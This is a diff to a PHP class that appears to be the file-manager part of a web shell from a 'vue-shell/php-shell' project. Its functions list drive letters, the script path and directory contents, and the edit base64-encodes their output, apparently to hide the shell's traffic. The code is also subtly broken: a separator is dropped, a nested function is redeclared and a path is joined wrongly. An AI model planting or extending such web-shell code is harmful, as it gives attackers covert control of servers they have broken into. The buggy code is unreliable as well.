@@ -168,34 +168,55 @@ class File {
     }
 
     function dir3() {
-        $dir = 'F:\code\vue-shell\php-shell';
+        //todo php5.2路径后缀不能为/，7.3版本可以
+        $dir = 'D:/safe/code/vue-shell/php-shell';
         if (!@is_dir($dir)) {
             echo "ERROR:// Path Not Found Or No Permission!";
         } else {
             $res = '';
             foreach (scandir($dir) as $value) {
-                if ($value === '.' || $value === '..') continue;
+                if ($value === '.' || $value === '..') {
+                    continue;
+                }
                 $file = $dir . $value;
-                $res .= $value . '``' . (is_dir($file) ? '1' : '0') . '``' . date("Y/m/d H:i", filemtime($file)) . '``' . @filesize($file);
+                $res .= $value . '``';
+                $res .= is_dir($file) ? '1' : '0';
+                $res .= date("Y/m/d H:i", filemtime($file)) . '``';
+                $res .= @filesize($file);
                 $res .= "\n";
             }
-            $d_f = 'print_r';
-            echo $d_f($res);
+            function encode($val) {
+                echo base64_encode($val);
+            }
+
+            encode($res);
         }
     }
 
+
     function pwd() {
-        $path = dirname($_SERVER["SCRIPT_FILENAME"]);
-        if ($path == "") $path = dirname($_SERVER["PATH_TRANSLATED"]);
-        if ($path == "") $path = getcwd();
-        $root_path = '';
-        if (substr($path, 0, 1) != "/") {
-            foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $root_path .= "{$L}:|";
-        } else {
-            $root_path .= "/";
+        $path = dirname($_SERVER['SCRIPT_FILENAME']);
+        if (empty($path)) {
+            $path = dirname($_SERVER['PATH_TRANSLATED']);
         }
-        $a = 'print_r';
-        echo $a($root_path . '\`\`' . $path);
+        if (empty($path)) {
+            $path = getcwd();
+        }
+        $root_path = '';
+        if (substr($path, 0, 1) != '/') {
+            foreach (range('C', 'Z') as $L) {
+                if (is_dir($L . ':')) {
+                    $root_path .= $L . ':|';
+                }
+            }
+        } else {
+            $root_path .= '/';
+        }
+        function encode($val) {
+            echo base64_encode($val);
+        }
+
+        encode($root_path . '``' . $path);
     }
 
     function change() {
@@ -204,5 +225,5 @@ class File {
 }
 
 $f = new File();
-$f->pwd();
+$f->dir4();
 ?>
